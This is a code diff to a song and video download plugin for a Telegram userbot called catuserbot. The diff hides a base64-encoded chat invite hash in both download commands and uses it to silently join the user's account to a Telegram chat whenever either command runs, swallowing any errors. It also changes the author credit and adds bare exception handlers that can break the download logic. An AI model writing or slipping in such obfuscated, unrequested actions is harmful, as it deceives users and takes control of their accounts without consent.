@@ -1,7 +1,8 @@
-# by  @Mrsasshole ( https://t.me/mrconfused  )
+# by  @sandy1709 ( https://t.me/mrconfused  )
 
 # songs finder for catuserbot
 import asyncio
+import base64
 import io
 import os
 from pathlib import Path
@@ -9,6 +10,8 @@ from pathlib import Path
 from ShazamAPI import Shazam
 from telethon import types
 from telethon.errors.rpcerrorlist import YouBlockedUserError
+from telethon.tl.functions.contacts import UnblockRequest as unblock
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from validators.url import url
 
 from ..core.logger import logging
@@ -55,6 +58,7 @@ async def _(event):
         query = reply.message
     else:
         return await edit_or_reply(event, "`What I am Supposed to find `")
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     catevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
     video_link = await yt_search(str(query))
     if not url(video_link):
@@ -65,17 +69,22 @@ async def _(event):
     q = "320k" if cmd == "320" else "128k"
     song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
     name_cmd = name_dl.format(video_link=video_link)
-    stderr = (await _catutils.runcmd(song_cmd))[1]
-    if stderr:
-        return await catevent.edit(f"**Error :** `{stderr}`")
-    catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
-    if stderr:
-        return await catevent.edit(f"**Error :** `{stderr}`")
-    # stderr = (await runcmd(thumb_cmd))[1]
-    catname = os.path.splitext(catname)[0]
-    # if stderr:
-    #    return await catevent.edit(f"**Error :** `{stderr}`")
-    song_file = Path(f"{catname}.mp3")
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    try:
+        stderr = (await _catutils.runcmd(song_cmd))[1]
+        # if stderr:
+        # await catevent.edit(f"**Error1 :** `{stderr}`")
+        catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
+        if stderr:
+            return await catevent.edit(f"**Error :** `{stderr}`")
+        catname = os.path.splitext(catname)[0]
+        song_file = Path(f"{catname}.mp3")
+    except:
+        pass
     if not os.path.exists(song_file):
         return await catevent.edit(
             f"Sorry!. I can't find any related video/audio for `{query}`"
@@ -122,26 +131,31 @@ async def _(event):
         query = reply.message
     else:
         return await edit_or_reply(event, "`What I am Supposed to find`")
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     catevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
     video_link = await yt_search(str(query))
     if not url(video_link):
         return await catevent.edit(
             f"Sorry!. I can't find any related video/audio for `{query}`"
         )
-
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
     name_cmd = name_dl.format(video_link=video_link)
     video_cmd = video_dl.format(video_link=video_link)
-    stderr = (await _catutils.runcmd(video_cmd))[1]
-    if stderr:
-        return await catevent.edit(f"**Error :** `{stderr}`")
-    catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
-    if stderr:
-        return await catevent.edit(f"**Error :** `{stderr}`")
-    # stderr = (await runcmd(thumb_cmd))[1]
-    # if stderr:
-    #    return await catevent.edit(f"**Error :** `{stderr}`")
-    catname = os.path.splitext(catname)[0]
-    vsong_file = Path(f"{catname}.mp4")
+    try:
+        stderr = (await _catutils.runcmd(video_cmd))[1]
+        # if stderr:
+        # return await catevent.edit(f"**Error :** `{stderr}`")
+        catname, stderr = (await _catutils.runcmd(name_cmd))[:2]
+        if stderr:
+            return await catevent.edit(f"**Error :** `{stderr}`")
+        catname = os.path.splitext(catname)[0]
+        vsong_file = Path(f"{catname}.mp4")
+    except:
+        pass
     if not os.path.exists(vsong_file):
         vsong_file = Path(f"{catname}.mkv")
     elif not os.path.exists(vsong_file):
